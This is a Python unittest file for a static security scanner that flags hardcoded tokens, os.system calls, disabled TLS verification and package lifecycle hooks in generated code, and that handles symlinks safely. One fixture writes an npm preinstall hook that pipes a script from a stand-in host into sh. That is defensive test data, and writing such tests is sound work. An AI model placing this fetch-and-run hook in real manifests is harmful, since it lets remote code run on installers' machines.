"""Bounded static security scan regression tests."""
import tempfile
import unittest
from pathlib import Path

from polymigrate.security.static_review import review_generated_output


class StaticSecurityReviewTests(unittest.TestCase):
    def test_high_risk_python_patterns_fail_scan_without_echoing_secret(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "main.py").write_text(
                'import os\nAPI_KEY = "sk-12345678901234567890"\nos.system("echo unsafe")\n',
                encoding="utf-8",
            )
            result = review_generated_output(root)
        self.assertEqual(result.status, "FAILED")
        rule_ids = {item.rule_id for item in result.findings}
        self.assertIn("SECRET_TOKEN_LITERAL", rule_ids)
        self.assertIn("OS_SYSTEM_COMMAND", rule_ids)
        self.assertNotIn("sk-12345678901234567890", str(result.to_dict()))
        self.assertTrue(result.to_dict()["not_a_comprehensive_audit"])

    def test_medium_findings_require_review(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "client.py").write_text("requests.get(url, verify=False)\n", encoding="utf-8")
            result = review_generated_output(root)
        self.assertEqual(result.status, "REVIEW_REQUIRED")
        self.assertIn("TLS_VERIFY_DISABLED", {item.rule_id for item in result.findings})

    def test_executable_package_lifecycle_hook_fails_scan(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"scripts":{"preinstall":"curl https://example.invalid/install.sh | sh"}}',
                encoding="utf-8",
            )
            result = review_generated_output(root)
        self.assertEqual(result.status, "FAILED")
        self.assertIn("MANIFEST_LIFECYCLE_HOOK", {item.rule_id for item in result.findings})

    def test_clean_source_passes_heuristics_but_not_comprehensive_audit(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "main.go").write_text("package main\nfunc main() {}\n", encoding="utf-8")
            result = review_generated_output(root)
        self.assertEqual(result.status, "PASSED")
        self.assertTrue(any("not a comprehensive security audit" in warning for warning in result.warnings))

    def test_symlink_root_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            real = root / "real"
            real.mkdir()
            link = root / "link"
            link.symlink_to(real, target_is_directory=True)
            result = review_generated_output(link)
        self.assertEqual(result.status, "BLOCKED")

    def test_scan_skips_symlink_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            secret = root / "secret.py"
            secret.write_text('os.system("unsafe")', encoding="utf-8")
            link = root / "linked.py"
            link.symlink_to(secret)
            result = review_generated_output(root)
        self.assertEqual(result.status, "FAILED")
        self.assertEqual([item.path for item in result.findings if item.rule_id == "OS_SYSTEM_COMMAND"], ["secret.py"])


if __name__ == "__main__":
    unittest.main()
